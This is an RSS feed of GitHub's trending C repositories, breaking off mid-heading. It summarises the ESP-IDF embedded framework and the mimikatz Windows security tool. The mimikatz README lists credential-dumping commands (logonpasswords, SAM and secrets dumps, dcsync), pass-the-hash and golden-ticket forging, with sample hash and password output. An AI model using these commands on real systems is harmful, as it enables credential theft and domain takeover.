<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-11-20T01:40:18Z</updated>
  <subtitle>Weekly Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>espressif/esp-idf</title>
    <updated>2022-11-20T01:40:18Z</updated>
    <id>tag:github.com,2022-11-20:/espressif/esp-idf</id>
    <link href="https://github.com/espressif/esp-idf" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Espressif IoT Development Framework. Official development framework for Espressif SoCs.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Espressif IoT Development Framework&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/README_CN.md&#34;&gt;中文版&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;ESP-IDF is the development framework for Espressif SoCs supported on Windows, Linux and macOS.&lt;/p&gt; &#xA;&lt;h1&gt;ESP-IDF Release Support Schedule&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://dl.espressif.com/dl/esp-idf/support-periods.svg?sanitize=true&#34; alt=&#34;Support Schedule&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Please read &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/SUPPORT_POLICY.md&#34;&gt;the support policy&lt;/a&gt; and &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/esp32/versions.html&#34;&gt;the documentation&lt;/a&gt; for more information about ESP-IDF versions.&lt;/li&gt; &#xA; &lt;li&gt;Please see the &lt;a href=&#34;https://www.espressif.com/en/support/documents/advisories?keys=&amp;amp;field_type_of_advisory_tid%5B%5D=817&#34;&gt;End-of-Life Advisories&lt;/a&gt; for information about ESP-IDF releases with discontinued support.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;ESP-IDF Release and SoC Compatibility&lt;/h1&gt; &#xA;&lt;p&gt;The following table shows ESP-IDF support of Espressif SoCs where &lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt; and &lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt; denote preview status and support, respectively. The preview support is usually limited in time and intended for beta versions of chips. Please use an ESP-IDF release where the desired SoC is already supported.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;Chip&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.1&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.2&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.3&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.4&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v5.0&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v5.1&lt;/th&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-S2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-C3&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-S3&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32_S3&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-C2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32-C2&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-C6&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32_C6&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-H2 beta1/2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32_H2&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Espressif SoCs released before 2016 (ESP8266 and ESP8285) are supported by &lt;a href=&#34;https://github.com/espressif/ESP8266_RTOS_SDK&#34;&gt;RTOS SDK&lt;/a&gt; instead.&lt;/p&gt; &#xA;&lt;h1&gt;Developing With ESP-IDF&lt;/h1&gt; &#xA;&lt;h2&gt;Setting Up ESP-IDF&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://idf.espressif.com/&#34;&gt;https://idf.espressif.com/&lt;/a&gt; for links to detailed instructions on how to set up the ESP-IDF depending on chip you use.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Each SoC series and each ESP-IDF release has its own documentation. Please see Section &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/esp32/versions.html&#34;&gt;Versions&lt;/a&gt; on how to find documentation and how to checkout specific release of ESP-IDF.&lt;/p&gt; &#xA;&lt;h3&gt;Non-GitHub forks&lt;/h3&gt; &#xA;&lt;p&gt;ESP-IDF uses relative locations as its submodules URLs (&lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/.gitmodules&#34;&gt;.gitmodules&lt;/a&gt;). So they link to GitHub. If ESP-IDF is forked to a Git repository which is not on GitHub, you will need to run the script &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/tools/set-submodules-to-github.sh&#34;&gt;tools/set-submodules-to-github.sh&lt;/a&gt; after git clone.&lt;/p&gt; &#xA;&lt;p&gt;The script sets absolute URLs for all submodules, allowing &lt;code&gt;git submodule update --init --recursive&lt;/code&gt; to complete. If cloning ESP-IDF from GitHub, this step is not needed.&lt;/p&gt; &#xA;&lt;h2&gt;Finding a Project&lt;/h2&gt; &#xA;&lt;p&gt;As well as the &lt;a href=&#34;https://github.com/espressif/esp-idf-template&#34;&gt;esp-idf-template&lt;/a&gt; project mentioned in Getting Started, ESP-IDF comes with some example projects in the &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/examples&#34;&gt;examples&lt;/a&gt; directory.&lt;/p&gt; &#xA;&lt;p&gt;Once you&#39;ve found the project you want to work with, change to its directory and you can configure and build it.&lt;/p&gt; &#xA;&lt;p&gt;To start your own project based on an example, copy the example project directory outside of the ESP-IDF directory.&lt;/p&gt; &#xA;&lt;h1&gt;Quick Reference&lt;/h1&gt; &#xA;&lt;p&gt;See the Getting Started guide links above for a detailed setup guide. This is a quick reference for common commands when working with ESP-IDF projects:&lt;/p&gt; &#xA;&lt;h2&gt;Setup Build Environment&lt;/h2&gt; &#xA;&lt;p&gt;(See the Getting Started guide listed above for a full list of required steps with more details.)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install host build dependencies mentioned in the Getting Started guide.&lt;/li&gt; &#xA; &lt;li&gt;Run the install script to set up the build environment. The options include &lt;code&gt;install.bat&lt;/code&gt; or &lt;code&gt;install.ps1&lt;/code&gt; for Windows, and &lt;code&gt;install.sh&lt;/code&gt; or &lt;code&gt;install.fish&lt;/code&gt; for Unix shells.&lt;/li&gt; &#xA; &lt;li&gt;Run the export script on Windows (&lt;code&gt;export.bat&lt;/code&gt;) or source it on Unix (&lt;code&gt;source export.sh&lt;/code&gt;) in every shell environment before using ESP-IDF.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Configuring the Project&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py set-target &amp;lt;chip_name&amp;gt;&lt;/code&gt; sets the target of the project to &lt;code&gt;&amp;lt;chip_name&amp;gt;&lt;/code&gt;. Run &lt;code&gt;idf.py set-target&lt;/code&gt; without any arguments to see a list of supported targets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py menuconfig&lt;/code&gt; opens a text-based configuration menu where you can configure the project.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Compiling the Project&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py build&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;... will compile app, bootloader and generate a partition table based on the config.&lt;/p&gt; &#xA;&lt;h2&gt;Flashing the Project&lt;/h2&gt; &#xA;&lt;p&gt;When the build finishes, it will print a command line to use esptool.py to flash the chip. However you can also do this automatically by running:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py -p PORT flash&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Replace PORT with the name of your serial port (like &lt;code&gt;COM3&lt;/code&gt; on Windows, &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; on Linux, or &lt;code&gt;/dev/cu.usbserial-X&lt;/code&gt; on MacOS. If the &lt;code&gt;-p&lt;/code&gt; option is left out, &lt;code&gt;idf.py flash&lt;/code&gt; will try to flash the first available serial port.&lt;/p&gt; &#xA;&lt;p&gt;This will flash the entire project (app, bootloader and partition table) to a new chip. The settings for serial port flashing can be configured with &lt;code&gt;idf.py menuconfig&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You don&#39;t need to run &lt;code&gt;idf.py build&lt;/code&gt; before running &lt;code&gt;idf.py flash&lt;/code&gt;, &lt;code&gt;idf.py flash&lt;/code&gt; will automatically rebuild anything which needs it.&lt;/p&gt; &#xA;&lt;h2&gt;Viewing Serial Output&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;idf.py monitor&lt;/code&gt; target uses the &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html&#34;&gt;idf_monitor tool&lt;/a&gt; to display serial output from Espressif SoCs. idf_monitor also has a range of features to decode crash output and interact with the device. &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html&#34;&gt;Check the documentation page for details&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Exit the monitor by typing Ctrl-].&lt;/p&gt; &#xA;&lt;p&gt;To build, flash and monitor output in one pass, you can run:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py flash monitor&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Compiling &amp;amp; Flashing Only the App&lt;/h2&gt; &#xA;&lt;p&gt;After the initial flash, you may just want to build and flash just your app, not the bootloader and partition table:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py app&lt;/code&gt; - build just the app.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; - flash just the app.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; will automatically rebuild the app if any source files have changed.&lt;/p&gt; &#xA;&lt;p&gt;(In normal development there&#39;s no downside to reflashing the bootloader and partition table each time, if they haven&#39;t changed.)&lt;/p&gt; &#xA;&lt;h2&gt;Erasing Flash&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;idf.py flash&lt;/code&gt; target does not erase the entire flash contents. However it is sometimes useful to set the device back to a totally erased state, particularly when making partition table changes or OTA app updates. To erase the entire flash, run &lt;code&gt;idf.py erase-flash&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This can be combined with other targets, ie &lt;code&gt;idf.py -p PORT erase-flash flash&lt;/code&gt; will erase everything and then re-flash the new app, bootloader and partition table.&lt;/p&gt; &#xA;&lt;h1&gt;Resources&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Documentation for the latest version: &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/&#34;&gt;https://docs.espressif.com/projects/esp-idf/&lt;/a&gt;. This documentation is built from the &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/docs&#34;&gt;docs directory&lt;/a&gt; of this repository.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;a href=&#34;https://esp32.com/&#34;&gt;esp32.com forum&lt;/a&gt; is a place to ask questions and find community resources.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/espressif/esp-idf/issues&#34;&gt;Check the Issues section on github&lt;/a&gt; if you find a bug or have a feature request. Please check existing Issues before opening a new one.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you&#39;re interested in contributing to ESP-IDF, please check the &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/contribute/index.html&#34;&gt;Contributions Guide&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>gentilkiwi/mimikatz</title>
    <updated>2022-11-20T01:40:18Z</updated>
    <id>tag:github.com,2022-11-20:/gentilkiwi/mimikatz</id>
    <link href="https://github.com/gentilkiwi/mimikatz" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A little tool to play with Windows security&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;mimikatz&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;mimikatz&lt;/code&gt;&lt;/strong&gt; is a tool I&#39;ve made to learn &lt;code&gt;C&lt;/code&gt; and make somes experiments with Windows security.&lt;/p&gt; &#xA;&lt;p&gt;It&#39;s now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. &lt;strong&gt;&lt;code&gt;mimikatz&lt;/code&gt;&lt;/strong&gt; can also perform pass-the-hash, pass-the-ticket or build &lt;em&gt;Golden tickets&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  .#####.   mimikatz 2.0 alpha (x86) release &#34;Kiwi en C&#34; (Apr  6 2014 22:02:03)&#xA; .## ^ ##.&#xA; ## / \ ##  /* * *&#xA; ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&#xA; &#39;## v ##&#39;   https://blog.gentilkiwi.com/mimikatz             (oe.eo)&#xA;  &#39;#####&#39;                                    with  13 modules * * */&#xA;&#xA;&#xA;mimikatz # privilege::debug&#xA;Privilege &#39;20&#39; OK&#xA; &#xA;mimikatz # sekurlsa::logonpasswords&#xA; &#xA;Authentication Id : 0 ; 515764 (00000000:0007deb4)&#xA;Session           : Interactive from 2&#xA;User Name         : Gentil Kiwi&#xA;Domain            : vm-w7-ult-x&#xA;SID               : S-1-5-21-1982681256-1210654043-1600862990-1000&#xA;        msv :&#xA;         [00000003] Primary&#xA;         * Username : Gentil Kiwi&#xA;         * Domain   : vm-w7-ult-x&#xA;         * LM       : d0e9aee149655a6075e4540af1f22d3b&#xA;         * NTLM     : cc36cf7a8514893efccd332446158b1a&#xA;         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30&#xA;        tspkg :&#xA;         * Username : Gentil Kiwi&#xA;         * Domain   : vm-w7-ult-x&#xA;         * Password : waza1234/&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But that&#39;s not all! &lt;code&gt;Crypto&lt;/code&gt;, &lt;code&gt;Terminal Server&lt;/code&gt;, &lt;code&gt;Events&lt;/code&gt;, ... lots of informations in the GitHub Wiki &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki&#34;&gt;https://github.com/gentilkiwi/mimikatz/wiki&lt;/a&gt; or on &lt;a href=&#34;https://blog.gentilkiwi.com&#34;&gt;https://blog.gentilkiwi.com&lt;/a&gt; (in French, &lt;em&gt;yes&lt;/em&gt;).&lt;/p&gt; &#xA;&lt;p&gt;If you don&#39;t want to build it, binaries are availables on &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/releases&#34;&gt;https://github.com/gentilkiwi/mimikatz/releases&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quick usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;log&#xA;privilege::debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;sekurlsa&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;sekurlsa::logonpasswords&#xA;sekurlsa::tickets /export&#xA;&#xA;sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;kerberos&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;kerberos::list /export&#xA;kerberos::ptt c:\chocolate.kirbi&#xA;&#xA;kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;crypto&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;crypto::capi&#xA;crypto::cng&#xA;&#xA;crypto::certificates /export&#xA;crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE&#xA;&#xA;crypto::keys /export&#xA;crypto::keys /machine /export&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;vault &amp;amp; lsadump&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;vault::cred&#xA;vault::list&#xA;&#xA;token::elevate&#xA;vault::cred&#xA;vault::list&#xA;lsadump::sam&#xA;lsadump::secrets&#xA;lsadump::cache&#xA;token::revert&#xA;&#xA;lsadump::dcsync /user:domain\krbtgt /domain:lab.local&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;for &lt;code&gt;mimikatz&lt;/code&gt; and &lt;code&gt;mimilib&lt;/code&gt; : Visual Studio 2010, 2012 or 2013 for Desktop (&lt;strong&gt;2013 Express for Desktop is free and supports x86 &amp;amp; x64&lt;/strong&gt; - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=44914&#34;&gt;http://www.microsoft.com/download/details.aspx?id=44914&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;for &lt;code&gt;mimikatz driver&lt;/code&gt;, &lt;code&gt;mimilove&lt;/code&gt; (and &lt;code&gt;ddk2003&lt;/code&gt; platform) : Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK) - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=11800&#34;&gt;http://www.microsoft.com/download/details.aspx?id=11800&lt;/a&gt;&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; uses &lt;code&gt;SVN&lt;/code&gt; for source control, but is now available with &lt;code&gt;GIT&lt;/code&gt; too! You can use any tools you want to sync, even incorporated &lt;code&gt;GIT&lt;/code&gt; in Visual Studio 2013 =)&lt;/p&gt; &#xA;&lt;h3&gt;Synchronize!&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GIT URL is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz.git&#34;&gt;https://github.com/gentilkiwi/mimikatz.git&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;SVN URL is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/trunk&#34;&gt;https://github.com/gentilkiwi/mimikatz/trunk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ZIP file is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/archive/master.zip&#34;&gt;https://github.com/gentilkiwi/mimikatz/archive/master.zip&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Build the solution&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;After opening the solution, &lt;code&gt;Build&lt;/code&gt; / &lt;code&gt;Build Solution&lt;/code&gt; (you can change architecture)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;mimikatz&lt;/code&gt; is now built and ready to be used! (&lt;code&gt;Win32&lt;/code&gt; / &lt;code&gt;x64&lt;/code&gt; even &lt;code&gt;ARM64&lt;/code&gt; if you&#39;re lucky) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;you can have error &lt;code&gt;MSB3073&lt;/code&gt; about &lt;code&gt;_build_.cmd&lt;/code&gt; and &lt;code&gt;mimidrv&lt;/code&gt;, it&#39;s because the driver cannot be build without Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK), but &lt;code&gt;mimikatz&lt;/code&gt; and &lt;code&gt;mimilib&lt;/code&gt; are OK.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;ddk2003&lt;/h3&gt; &#xA;&lt;p&gt;With this optional MSBuild platform, you can use the WinDDK build tools, and the default &lt;code&gt;msvcrt&lt;/code&gt; runtime (smaller binaries, no dependencies)&lt;/p&gt; &#xA;&lt;p&gt;For this optional platform, Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK) - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=11800&#34;&gt;http://www.microsoft.com/download/details.aspx?id=11800&lt;/a&gt; and Visual Studio &lt;strong&gt;2010&lt;/strong&gt; are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.&lt;/p&gt; &#xA;&lt;p&gt;Follow instructions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme&#34;&gt;https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader&#34;&gt;https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader&lt;/a&gt;&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Continuous 